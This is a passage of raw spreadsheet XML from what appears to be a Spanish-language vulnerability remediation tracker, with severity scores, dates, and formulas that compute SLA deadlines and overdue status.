        <f t="shared" ca="1" si="15"/>
        <v>574</v>
      </c>
      <c r="V380" s="1">
        <f t="shared" si="16"/>
        <v>45725</v>
      </c>
      <c r="W380" s="56" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB380" t="s">
        <v>1537</v>
      </c>
      <c r="AC380" t="s">
        <v>1538</v>
      </c>
      <c r="AE380" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AG380" s="68" t="s">
        <v>969</v>
      </c>
      <c r="AH380" t="str">
        <f>IFERROR(VLOOKUP(H380,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="381" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A381" s="5">
        <v>380</v>
      </c>
      <c r="B381" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C381" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D381" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G381" s="60" t="s">
        <v>1539</v>
      </c>
      <c r="H381" t="s">
        <v>1540</v>
      </c>
      <c r="J381" t="s">
        <v>556</v>
      </c>
      <c r="L381" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M381" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N381">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q381" t="s">
        <v>1541</v>
      </c>
      <c r="T381" s="1">
        <v>45794</v>
      </c>
      <c r="U381" s="67">
        <f t="shared" ca="1" si="15"/>
        <v>415</v>
      </c>
      <c r="V381" s="1">
        <f t="shared" si="16"/>
        <v>45884</v>
      </c>
      <c r="W381" s="56" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB381" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC381" t="s">
        <v>1516</v>
      </c>
      <c r="AE381" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AG381" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH381" t="str">
        <f>IFERROR(VLOOKUP(H381,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="382" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A382" s="5">
        <v>381</v>
      </c>
      <c r="B382" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C382" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D382" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G382" s="60" t="s">
        <v>1539</v>
      </c>
      <c r="H382" t="s">
        <v>1543</v>
      </c>
      <c r="J382" t="s">
        <v>560</v>
      </c>
      <c r="L382" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M382" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N382">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q382" t="s">
        <v>1541</v>
      </c>
      <c r="T382" s="1">
        <v>45794</v>
      </c>
      <c r="U382" s="67">
        <f t="shared" ca="1" si="15"/>
        <v>415</v>
      </c>
      <c r="V382" s="1">
        <f t="shared" si="16"/>
        <v>45884</v>
      </c>
      <c r="W382" s="56" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB382" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC382" t="s">
        <v>1523</v>
      </c>
      <c r="AE382" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AG382" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH382" t="str">
        <f>IFERROR(VLOOKUP(H382,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="383" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A383" s="5">
        <v>382</v>
      </c>
      <c r="B383" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C383" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D383" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G383" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H383" t="s">
        <v>1544</v>
      </c>
      <c r="J383" t="s">
        <v>971</v>
      </c>
      <c r="L383" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M383" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N383">
        <v>4.7</v>
      </c>
      <c r="Q383" t="s">
        <v>1545</v>
      </c>
      <c r="T383" s="1">
        <v>45527</v>
      </c>
      <c r="U383" s="67">
        <f t="shared" ca="1" si="15"/>
        <v>682</v>
      </c>
      <c r="V383" s="1">
        <f t="shared" si="16"/>
        <v>45617</v>
      </c>
      <c r="W383" s="56" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB383" s="69" t="s">
        <v>1546</v>
      </c>
      <c r="AC383" t="s">
        <v>1547</v>
      </c>
      <c r="AE383" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AG383" s="68" t="s">
        <v>974</v>
      </c>
      <c r="AH383" t="str">
        <f>IFERROR(VLOOKUP(H383,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="384" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A384" s="5">
        <v>383</v>
      </c>
      <c r="B384" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C384" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D384" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G384" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H384" t="s">
        <v>1548</v>
      </c>
      <c r="I384" t="s">
        <v>1549</v>
      </c>
      <c r="J384" t="s">
        <v>1095</v>
      </c>
      <c r="L384" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M384" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N384">
        <v>10</v>
      </c>
      <c r="Q384" t="s">
        <v>1550</v>
      </c>
      <c r="T384" s="1">
        <v>45832</v>
      </c>
      <c r="U384" s="67">
        <f t="shared" ca="1" si="15"/>
        <v>377</v>
      </c>
      <c r="V384" s="1">
        <f t="shared" si="16"/>
        <v>45842</v>
      </c>
      <c r="W384" s="56" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB384" s="65" t="s">
        <v>1551</v>
      </c>
      <c r="AC384" s="65" t="s">
        <v>1552</v>
      </c>
      <c r="AD384" s="65" t="s">
        <v>1553</v>
      </c>
      <c r="AE384" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG384" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH384" t="str">
        <f>IFERROR(VLOOKUP(H384,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="385" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A385" s="5">
        <v>384</v>
      </c>
      <c r="B385" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C385" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D385" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G385" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H385" t="s">
        <v>1554</v>
      </c>
      <c r="I385" t="s">
        <v>1555</v>
      </c>
      <c r="J385" t="s">
        <v>1095</v>
      </c>
      <c r="L385" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M385" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N385">
        <v>10</v>
      </c>
      <c r="Q385" t="s">
        <v>1556</v>
      </c>
      <c r="T385" s="1">
        <v>45833</v>
      </c>
      <c r="U385" s="67">
        <f t="shared" ca="1" si="15"/>
        <v>376</v>
      </c>
      <c r="V385" s="1">
        <f t="shared" si="16"/>
        <v>45843</v>
      </c>
      <c r="W385" s="56" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB385" s="65" t="s">
        <v>1557</v>
      </c>
      <c r="AC385" s="65" t="s">
        <v>1558</v>
      </c>
      <c r="AD385" s="65" t="s">
        <v>1559</v>
      </c>
      <c r="AE385" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG385" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH385" t="str">
        <f>IFERROR(VLOOKUP(H385,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="386" spans="1:34" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A386" s="5">
        <v>385</v>
      </c>
      <c r="B386" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C386" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D386" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G386" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="I386" t="s">
        <v>1560</v>
      </c>
      <c r="J386" t="s">
        <v>1561</v>
      </c>
      <c r="L386" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M386" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N386">
        <v>3.1</v>
      </c>
      <c r="Q386" s="80" t="s">
        <v>1168</v>
      </c>
      <c r="T386" s="1">
        <v>45833</v>
      </c>
      <c r="U386" s="67">
        <f t="shared" ref="U386:U449" ca="1" si="18">TODAY()-T386</f>
        <v>376</v>
      </c>
      <c r="V386" s="1">
        <f t="shared" ref="V386:V408" si="19">IF(M386="Critical",T386+10,IF(M386="High",T386+30,IF(M386="Bad",T386+30,IF(M386="Medium",T386+90,IF(M386="Warm",T386+90,IF(M386="Low",T386+120,IF(M386="Fair",T386+120,IF(M386="Neutral",T386+120,""))))))))</f>
        <v>45953</v>
      </c>
      <c r="W386" s="56" t="str">
        <f t="shared" ref="W386:W408" ca="1" si="20">IF(M386="Critical",IF(U386&gt;10,"SLA Vencido","En SLA"),IF(M386="High",IF(U386&gt;30,"SLA Vencido","En SLA"),IF(M386="Bad",IF(U386&gt;30,"SLA Vencido","En SLA"),IF(M386="Medium",IF(U386&gt;90,"SLA Vencido","En SLA"),IF(M386="Warm",IF(U386&gt;90,"SLA Vencido","En SLA"),IF(M386="Low",IF(U386&gt;120,"SLA Vencido","En SLA"),IF(M386="Fair",IF(U386&gt;120,"SLA Vencido","En SLA"),IF(M386="Neutral",IF(U386&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB386" s="79" t="s">
        <v>1562</v>
      </c>
      <c r="AC386" s="79" t="s">
        <v>1563</v>
      </c>
      <c r="AD386" s="79" t="s">
        <v>1564</v>
      </c>
      <c r="AE386" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG386" s="68" t="s">
        <v>1179</v>
      </c>
      <c r="AH386" t="str">
        <f>IFERROR(VLOOKUP(H386,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="387" spans="1:34" ht="87" x14ac:dyDescent="0.35">
      <c r="A387" s="5">
        <v>386</v>
      </c>
      <c r="B387" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C387" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D387" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G387" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="I387" t="s">
        <v>1565</v>
      </c>
      <c r="J387" t="s">
        <v>1192</v>
      </c>
      <c r="L387" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M387" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N387">
        <v>2.8</v>
      </c>
      <c r="Q387" t="s">
        <v>1566</v>
      </c>
      <c r="T387" s="1">
        <v>45833</v>
      </c>
      <c r="U387" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>376</v>
      </c>
      <c r="V387" s="1">
        <f t="shared" si="19"/>
        <v>45953</v>
      </c>
      <c r="W387" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB387" s="79" t="s">
        <v>1567</v>
      </c>
      <c r="AC387" s="79" t="s">
        <v>1568</v>
      </c>
      <c r="AD387" s="79" t="s">
        <v>1569</v>
      </c>
      <c r="AE387" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG387" s="68" t="s">
        <v>1179</v>
      </c>
      <c r="AH387" t="str">
        <f>IFERROR(VLOOKUP(H387,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="388" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A388" s="5">
        <v>387</v>
      </c>
      <c r="B388" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C388" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D388" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G388" s="60" t="s">
        <v>138</v>
      </c>
      <c r="H388" t="s">
        <v>1570</v>
      </c>
      <c r="I388" t="s">
        <v>1571</v>
      </c>
      <c r="J388" t="s">
        <v>890</v>
      </c>
      <c r="L388" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M388" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N388">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q388" t="s">
        <v>1572</v>
      </c>
      <c r="T388" s="1">
        <v>45833</v>
      </c>
      <c r="U388" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>376</v>
      </c>
      <c r="V388" s="1">
        <f t="shared" si="19"/>
        <v>45923</v>
      </c>
      <c r="W388" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB388" s="65" t="s">
        <v>1573</v>
      </c>
      <c r="AC388" s="65" t="s">
        <v>1574</v>
      </c>
      <c r="AD388" s="65" t="s">
        <v>1575</v>
      </c>
      <c r="AE388" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG388" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH388" t="str">
        <f>IFERROR(VLOOKUP(H388,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="389" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A389" s="5">
        <v>388</v>
      </c>
      <c r="B389" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C389" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D389" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G389" s="60" t="s">
        <v>138</v>
      </c>
      <c r="I389" t="s">
        <v>1576</v>
      </c>
      <c r="J389" t="s">
        <v>1192</v>
      </c>
      <c r="L389" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M389" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N389">
        <v>2.8</v>
      </c>
      <c r="Q389" t="s">
        <v>1572</v>
      </c>
      <c r="T389" s="1">
        <v>45833</v>
      </c>
      <c r="U389" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>376</v>
      </c>
      <c r="V389" s="1">
        <f t="shared" si="19"/>
        <v>45953</v>
      </c>
      <c r="W389" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB389" s="79" t="s">
        <v>1567</v>
      </c>
      <c r="AC389" s="79" t="s">
        <v>1568</v>
      </c>
      <c r="AD389" s="79" t="s">
        <v>1569</v>
      </c>
      <c r="AE389" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG389" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH389" t="str">
        <f>IFERROR(VLOOKUP(H389,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="390" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A390" s="5">
        <v>389</v>
      </c>
      <c r="B390" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C390" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D390" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G390" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H390" t="s">
        <v>1577</v>
      </c>
      <c r="I390" t="s">
        <v>1578</v>
      </c>
      <c r="J390" t="s">
        <v>1579</v>
      </c>
      <c r="L390" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M390" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N390" t="s">
        <v>1580</v>
      </c>
      <c r="Q390" t="s">
        <v>1581</v>
      </c>
      <c r="T390" s="1">
        <v>45839</v>
      </c>
      <c r="U390" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V390" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W390" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB390" s="65" t="s">
        <v>1582</v>
      </c>
      <c r="AC390" s="65" t="s">
        <v>1583</v>
      </c>
      <c r="AD390" s="65" t="s">
        <v>1584</v>
      </c>
      <c r="AE390" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG390" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH390" t="str">
        <f>IFERROR(VLOOKUP(H390,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="391" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A391" s="5">
        <v>390</v>
      </c>
      <c r="B391" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C391" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D391" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G391" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H391" t="s">
        <v>1585</v>
      </c>
      <c r="I391" t="s">
        <v>1586</v>
      </c>
      <c r="J391" t="s">
        <v>1579</v>
      </c>
      <c r="L391" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M391" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N391" t="s">
        <v>1580</v>
      </c>
      <c r="Q391" t="s">
        <v>1587</v>
      </c>
      <c r="T391" s="1">
        <v>45839</v>
      </c>
      <c r="U391" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V391" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W391" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB391" s="65" t="s">
        <v>1582</v>
      </c>
      <c r="AC391" s="65" t="s">
        <v>1583</v>
      </c>
      <c r="AD391" s="65" t="s">
        <v>1584</v>
      </c>
      <c r="AE391" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG391" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH391" t="str">
        <f>IFERROR(VLOOKUP(H391,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="392" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A392" s="5">
        <v>391</v>
      </c>
      <c r="B392" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C392" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D392" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G392" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H392" t="s">
        <v>1588</v>
      </c>
      <c r="I392" t="s">
        <v>1589</v>
      </c>
      <c r="J392" t="s">
        <v>1579</v>
      </c>
      <c r="L392" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M392" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N392" t="s">
        <v>1580</v>
      </c>
      <c r="Q392" t="s">
        <v>1590</v>
      </c>
      <c r="T392" s="1">
        <v>45839</v>
      </c>
      <c r="U392" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V392" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W392" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB392" s="65" t="s">
        <v>1582</v>
      </c>
      <c r="AC392" s="65" t="s">
        <v>1583</v>
      </c>
      <c r="AD392" s="65" t="s">
        <v>1584</v>
      </c>
      <c r="AE392" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG392" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH392" t="str">
        <f>IFERROR(VLOOKUP(H392,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="393" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A393" s="5">
        <v>392</v>
      </c>
      <c r="B393" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C393" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D393" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G393" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H393" t="s">
        <v>1591</v>
      </c>
      <c r="I393" t="s">
        <v>1592</v>
      </c>
      <c r="J393" t="s">
        <v>1579</v>
      </c>
      <c r="L393" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M393" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N393" t="s">
        <v>1580</v>
      </c>
      <c r="Q393" t="s">
        <v>1593</v>
      </c>
      <c r="T393" s="1">
        <v>45839</v>
      </c>
      <c r="U393" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V393" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W393" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB393" s="65" t="s">
        <v>1582</v>
      </c>
      <c r="AC393" s="65" t="s">
        <v>1583</v>
      </c>
      <c r="AD393" s="65" t="s">
        <v>1584</v>
      </c>
      <c r="AE393" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG393" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH393" t="str">
        <f>IFERROR(VLOOKUP(H393,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="394" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A394" s="5">
        <v>393</v>
      </c>
      <c r="B394" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C394" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D394" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G394" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H394" t="s">
        <v>1594</v>
      </c>
      <c r="I394" t="s">
        <v>1595</v>
      </c>
      <c r="J394" t="s">
        <v>1596</v>
      </c>
      <c r="L394" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M394" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N394" t="s">
        <v>1597</v>
      </c>
      <c r="Q394" t="s">
        <v>1587</v>
      </c>
      <c r="T394" s="1">
        <v>45839</v>
      </c>
      <c r="U394" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V394" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W394" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB394" s="65" t="s">
        <v>1598</v>
      </c>
      <c r="AC394" s="65" t="s">
        <v>1599</v>
      </c>
      <c r="AD394" s="65" t="s">
        <v>1600</v>
      </c>
      <c r="AE394" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG394" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH394" t="str">
        <f>IFERROR(VLOOKUP(H394,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="395" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A395" s="5">
        <v>394</v>
      </c>
      <c r="B395" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C395" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D395" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G395" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H395" t="s">
        <v>1601</v>
      </c>
      <c r="I395" t="s">
        <v>1602</v>
      </c>
      <c r="J395" t="s">
        <v>1596</v>
      </c>
      <c r="L395" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M395" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N395" t="s">
        <v>1603</v>
      </c>
      <c r="Q395" t="s">
        <v>1590</v>
      </c>
      <c r="T395" s="1">
        <v>45839</v>
      </c>
      <c r="U395" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V395" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W395" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB395" s="65" t="s">
        <v>1598</v>
      </c>
      <c r="AC395" s="65" t="s">
        <v>1599</v>
      </c>
      <c r="AD395" s="65" t="s">
        <v>1600</v>
      </c>
      <c r="AE395" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG395" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH395" t="str">
        <f>IFERROR(VLOOKUP(H395,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="396" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A396" s="5">
        <v>395</v>
      </c>
      <c r="B396" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C396" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D396" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G396" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H396" t="s">
        <v>1604</v>
      </c>
      <c r="I396" t="s">
        <v>1605</v>
      </c>
      <c r="J396" t="s">
        <v>1596</v>
      </c>
      <c r="L396" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M396" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N396" t="s">
        <v>1359</v>
      </c>
      <c r="Q396" t="s">
        <v>1593</v>
      </c>
      <c r="T396" s="1">
        <v>45839</v>
      </c>
      <c r="U396" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V396" s="1">
        <f t="shared" si="19"/>
        <v>45929</v>
      </c>
      <c r="W396" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB396" s="65" t="s">
        <v>1598</v>
      </c>
      <c r="AC396" s="65" t="s">
        <v>1599</v>
      </c>
      <c r="AD396" s="65" t="s">
        <v>1600</v>
      </c>
      <c r="AE396" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG396" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH396" t="str">
        <f>IFERROR(VLOOKUP(H396,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="397" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A397" s="5">
        <v>396</v>
      </c>
      <c r="B397" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C397" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D397" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G397" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I397" t="s">
        <v>1606</v>
      </c>
      <c r="J397" t="s">
        <v>1607</v>
      </c>
      <c r="L397" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M397" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N397" t="s">
        <v>1608</v>
      </c>
      <c r="Q397" t="s">
        <v>1587</v>
      </c>
      <c r="T397" s="1">
        <v>45839</v>
      </c>
      <c r="U397" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V397" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W397" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB397" s="65" t="s">
        <v>1609</v>
      </c>
      <c r="AC397" s="65" t="s">
        <v>1610</v>
      </c>
      <c r="AD397" s="65" t="s">
        <v>1611</v>
      </c>
      <c r="AE397" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG397" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH397" t="str">
        <f>IFERROR(VLOOKUP(H397,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="398" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A398" s="5">
        <v>397</v>
      </c>
      <c r="B398" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C398" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D398" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G398" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I398" t="s">
        <v>1612</v>
      </c>
      <c r="J398" t="s">
        <v>1613</v>
      </c>
      <c r="L398" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M398" t="s">
        <v>111</v>
      </c>
      <c r="N398" t="s">
        <v>1614</v>
      </c>
      <c r="Q398" t="s">
        <v>1550</v>
      </c>
      <c r="T398" s="1">
        <v>45839</v>
      </c>
      <c r="U398" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V398" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W398" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB398" s="65" t="s">
        <v>1615</v>
      </c>
      <c r="AC398" s="65" t="s">
        <v>1616</v>
      </c>
      <c r="AD398" s="65" t="s">
        <v>1617</v>
      </c>
      <c r="AE398" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG398" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH398" t="str">
